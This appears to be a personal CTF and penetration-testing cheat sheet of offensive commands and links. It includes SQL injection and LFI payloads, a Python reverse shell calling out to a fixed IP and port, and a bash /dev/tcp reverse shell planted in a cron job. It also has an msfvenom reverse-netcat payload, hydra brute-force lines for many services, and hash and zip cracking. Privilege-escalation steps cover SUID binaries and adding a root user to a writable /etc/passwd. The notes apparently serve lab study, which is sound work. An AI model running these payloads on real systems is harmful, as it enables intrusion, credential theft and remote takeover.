
netdiscover -i eth0 <br />
https://uppusaikiran.github.io/hacking/Capture-the-Flag-CheatSheet/

# Configuring new machine
Apt-get update && apt-get upgrade <br />
Apt-get dist-upgrade <br />
### Installing rdp
Apt-get install xrdp<br /><br />
After xrdp is installed you can start the server with the following command:<br />
Service xrdp start<br />
Service xrdp-sesman start <br />
update-rc.d xrdp enable <br />

### Install Terminator
sudo apt-get install terminator


### XSS
Cheatsheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

### SQL Injection
- https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads< br />
- https://www.codecademy.com/articles/sql-commands<br/>
- Cheatsheet: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
- https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
- https://ratiros01.medium.com/tryhackme-jurassic-park-80f976dcdcbb
- 

- ' UNION select 1 from information_schema.tables # <br />
- ' UNION select 1,2 from information_schema.tables #<br />
- ' UNION select 1,2,3 from information_schema.tables #<br /><br /><br />

- ' UNION select 1,table_schema,table_name from information_schema.tables #<br />
- ' UNION select 1,table_name,column_name from information_schema.columns #<br /><br />

Get other databases
- union select 1,group_concat(schema_name),3,4,5 from information_schema.schemata <br />

Retrieve table names
- union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=database()<br />

Retrieve column names of table ‘users’
- union select 1,group_concat(column_name),3,4,5 from information_schema.columns where  table_name='users' and  table_schema=database()<br />
- OR
- ' UNION SELECT NULL--
- ' UNION SELECT NULL,NULL--
- ' UNION SELECT NULL,NULL,NULL--
- Finally, we can start getting some valuable information. Simply replace some null values with SQL keywords to get information about the database.
- Here's a small list of thing you'd want to retrieve:
1. database()
2. user()
3. @@version
4. username
5. password
6. table_name
7. column_name
# until the error occurs
- sqlmap --url http://tbfc.net/login.php --tables --columns <br/>
<br/> intercept in burp, save item , save request then:
- sqlmap -r {request} --batch (replace {request} with your file name).
- https://www.hackingarticles.in/database-penetration-testing-using-sqlmap-part-1/
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://github.com/payloadbox/sql-injection-payload-list
- https://www.codecademy.com/articles/sql-commands
- https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
<br />
<br />
- git clone https://github.com/stamparm/DSSS.git && cd DSSS/
- Damn Small SQLi Scanner is an awesome little python script that allows us to check for SQLi vulnerability. Simply provide it with a link to the PHP parameter to run it.
- Main syntax: python3 dsss.py -u "LINK"
- extra: https://resources.infosecinstitute.com/topic/dumping-a-database-using-sql-injection/
### SQL 
- To access a database using the MySQL client, we would use the following syntax: **mysql -uUSERNAME -p**
This tells the client to connect to the local database using a username of USERNAME (Note the lack of space between the switch -u and the value!), using a password which it will ask us to enter when we run the command.

- The next thing we should do is use the **show databases;** command to see the databases available:
- To enter the database we use the** use DATABASE; **command, where DATABASE is the name of the target DB. We can then show all the tables in the database with s**how tables;**

- Let’s dump the users table. To do this we use the SQL command: **SELECT * FROM users;.**

- https://www.hackingarticles.in/mssql-penetration-testing-metasploit/
 
### Nmap
Scan for vulnerabilities: nmap -Pn --script vuln 10.x.x.x
nmap --script http-enum -p 80 xx.xx.xx.xx  <br />

- nmap -sC -sV -Av -oN nmap/anthem 10.10.139.243

-sC - run all the default scripts
-sV - find the version of all the service running on the target
-A - run the scan in aggressive mode
-v - show output in verbose mode
- nmap --script vuln -p X <target ip>
### SMB 
-  nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse  IP: enumerate shares
-  smbclient //<ip>/anonymous
- smbget -R smb://<ip>/anonymous 
### RSA
https://github.com/ius/rsatool<br />
https://github.com/Ganapati/RsaCtfTool

### SSH
https://medium.com/bugbountywriteup/cracking-ssh-private-key-passphrase-459ba17e8d5d

- scp name@ip:/home/dir/file.name $(pwd)   - dowloading file from ssh
### SSH tunelling
 - netstat -tulpn - what services are running
 - ssh -R 9001:127.0.0.1:9001 attacker@<attacker_ip>
### HASH
Identify hashes: https://hashes.com/en/tools/hash_identifier<br />
- example hashes: https://hashcat.net/wiki/doku.php?id=example_hashes
- https://www.tunnelsup.com/hash-analyzer/
Tool to identify hashes: https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master <br />
- *wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py*<br /> 
- *python3 hash-id.py*
- https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/
- john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 crack.txt
- hashcat -m 1410 -a 0 hash:salt --username test_user /usr/share/wordlists/rockyou.txt - sha256 with salt
- https://medium.com/infosec-adventures/identifying-and-cracking-hashes-7d580b9fd7f1
- https://gchq.github.io/CyberChef/
### Active Directory
PowerView-3.0 tips and tricks https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993

### Ghostcat
https://github.com/00theway/Ghostcat-CNVD-2020-10487

### Steganogrphy
- https://pequalsnp-team.github.io/cheatsheet/steganography-101 <br />
- https://github.com/DominicBreuker/stego-toolkit
- https://en.wikipedia.org/wiki/List_of_file_signatures
- binwalk -e file
- foremost -i file : extracts data from the given file.
- steghide extract -sf regular_image.jpeg
-  stegcracker regular_image.jpg /usr/share/wordlists/rockyou.txt 
<br>
-checklist : https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/steganography

### Java Deserialization Vulnerabilities
https://github.com/joaomatosf/jexboss

### commands
- sudo -l -U user <br />
- find / -perm -u=s -type f 2>/dev/null  : search the machine for executables with the SUID permission set: 
- find / -user igor -perm -4000 -exec ls -ldb {} \; earch the machine for executables with the SUID permission set:  for specific user
- https://gtfobins.github.io/
 
 <br /> 
in place where i can save file: echo "/bin/bash" >> root.sh
<br />chmod +x root.sh

### Shell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  <br />
https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

 enumeration start with “sudo -l -l” 
 If no command is specified, the -l (list) option will list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. If a command is specified and is permitted by the security policy, the fully-qualified path to the command is displayed along with any command line arguments. If command is specified but not allowed, sudo will exit with a status value of 1. If the -l option is specified with an l argument (i.e. -ll), or if -l is specified multiple times, a longer list format is used. 
 
 -https://netsec.ws/?p=337 - interactive tty
 - python3 -c 'import pty;pty.spawn("/bin/bash")'
 - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.101",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

#### Stabilize shell
Working inside the reverse shell:

- The first thing to do is use python3 -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better-featured bash shell. At this point, our shell will look a bit prettier, but we still won’t be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
- Step two is: export TERM=xterm – this will give us access to term commands such as clear.
- Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.


### command injection 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md

 ### Gobuster
  - gobuster dir -u xxx.xx.x.x -w /usr/share/wordlists/dirb/common.txt   
  - gobuster dir -u xxx.xx.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Fuzz
wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt
### other
Enable or disable protocols, ciphers, hashes and key exchange algorithms on Windows Server 2008, 2012, 2016 and 2019 : https://www.nartac.com/Products/IISCrypto
<br/>
- enum4linux
### SSH
 openssh to RS key:
 -convert the private key to the intermediate format SSHv2: puttygen yourkey -O private-sshcom -o newkey
- convert it back to RSA/PEM: ssh-keygen -i -f newkey > newkey_in_right_format
### brutforce
 - https://github.com/gnebbia/hydra_notes
#### FTP & SSH
- hydra -l username ftp://xxxxxxxxx -P /usr/share/wordlists/rockyou.txt   
- hydra -l username -v -V -P /usr/share/wordlists/rockyou.txt xxx.xx.xx.xx ssh

 #### other
- hydra -L usernames.txt -P pass.txt <IP> mysql
- hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
- hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
- hydra -P common-snmp-community-strings.txt target.com snmp
- hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
#### web
- hydra -l <username> -P <wordlist> xxx.xxx.xx.xx http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
 - http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
<br /> https://infinitelogins.com/2020/02/22/how-to-brute-force-websites-using-hydra/
#### zip files
- zip2john zipName.zip >zip.hash  - for john friendly hash
- john zipName.zip zip.hash
- fcrackzip -b --method 2 -D -p /usr/share/wordlists/rockyou.txt -v ./file.zip

### process snooping
https://github.com/DominicBreuker/pspy
 
 ### identify accounts
 - https://namechk.com/
 - https://whatsmyname.app/ 
 - https://namecheckup.com/ 
### Reverse image lookup
 - https://www.google.com/imghp
 - https://yandex.com/images/ 
 - https://tineye.com/ 
 - https://www.bing.com/visualsearch?FORM=ILPVIS
 
 ### Image metadata viewer
 http://exif.regex.info/ 
 
 
 ### Wpscan
 - wpscan --url http://xxxxx -e
 - get users and add them to user.txt to make a distionary of users to bruteforce
 - wpscan --url http://xxxx -P /usr/share/wordlists/rockyou.txt -U user.txt
- https://www.poftut.com/how-to-scan-wordpress-sites-with-wpscan-tutorial-for-security-vulnerabilities/
 
 ### Windows commands for info gathering:
 - https://www.fuzzysecurity.com/tutorials/16.html
- JAWS - Just Another Windows (Enum) Script: https://github.com/411Hall/JAWS
 
 ### Tomcat manager exploit
 https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/
 
 ### IRC 
 https://www.hackingtutorials.org/metasploit-tutorials/hacking-unreal-ircd-3-2-8-1/
 
 ### LFI
 - In order to perform the basic LFI attack, we’ll be manipulating the “URL language parameter” with “/etc/passwd” to access the password file present in the local system as:

<br />192.168.0.11/bWAPP/rlfi.php?language=/etc/passwd
 <br /> 192.168.0.11/bWAPP/rlfi.php?language=/etc/passwd%00
 
 - https://book.hacktricks.xyz/pentesting-web/file-inclusion
 - https://www.hackingarticles.in/comprehensive-guide-to-local-file-inclusion/
 
 
 ### CRON
 - cat /etc/crontab -  view what cron jobs are scheduled<br />
  If you're unfamiliar with crontab schedule expression, you can use https://crontab.guru.
 <br /> 
 get the reverse shell, check what crone job is being run. Create a file with that name and put this inside:
 - #!/bin/bash<br />
bash -i >& /dev/tcp/IP/9999 0>&1
 - After transferring it to the target, I set every permission with chmod 777 NameOfFile  and set up my ncat listener on port 9999.
 
 #### Payload in msfvenom
- msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
 ### searchslpoit
 Searchsploit useful commands:

 -   searchsploit “Linux Kernel”
 -   searchsploit -m 7618 — Paste the exploit in the current directory
 -   searchsploit -p 7618[.c] — Show complete path
 -   searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
 
 ### AWS
 #### Scanning 
 - pip3 install -r requirements.txt
 - python3 ./s3scanner.py sites.txt and press Enter to run the tool.< br/>
Here, sites.txt is a text file containing the target website URL that is scanned for open
S3 buckets. You can edit the sites.txt file to enter the target website URL of your
choice.
 - python3 ./s3scanner.py --include-closed --out-file found.txt --dump names.txt
 - python3 ./s3scanner.py names.txt
 - python ./s3scanner.py --list names.txt
 #### Exploiting
 -pip3 install awscli
 - https://console.aws.amazon.com
 - aws configure
 - Default region name field, type eu-west-1
 - Let us list the directories in the certifiedhacker1 bucket. In the terminal window, type **aws s3 ls s3://[Bucket Name]**
 -  aws s3 cp s3://bucket/folder/file.txt .
 -    List of S3 buckets: aws s3api list-buckets --query "Buckets[].Name"

  -  User Policies: aws iam list-user-policies

   - Role Policies: aws iam list-role-policies

    - Group policies: aws iam list-group-policies

   - Create user: aws iam create-user
 ### Cool links: 
 https://arnavtripathy98.medium.com/my-oscp-struggle-210a4496ffe8
 - https://guif.re/linuxeop
 - http://strongcourage.github.io/2020/05/03/enum.html
 - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 - https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist 
 - **https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ **- Basic Linux Privilege Escalation
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation
 
 ### LinEnum
 There are two ways to get LinEnum on the target machine. 
 <br />
 - The first way, is to go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using "**python3 -m http.server 8000**" . 
 - Then using "**wget**" on the target machine, and your local IP, you can grab the file from your local machine .
 - Then make the file executable using the command "**chmod +x FILENAME.sh**".
 
<br /> In case you're unable to transport the file, you can also, if you have sufficient permissions,
 - copy the raw LinEnum code from your local machine [1] and paste it into a new file on the target, using Vi or Nano [2].
 - Once you've done this, you can save the file with the ".sh" extension. 
 - Then make the file executable using the command "chmod +x FILENAME.sh".
 
 ### Editing writable /etc/passwd
 - create hash  "openssl passwd -1 -salt [salt] [password]"
 - in /etc/passwd add username:passwordhash:0:0:root:/root:/bin/bash

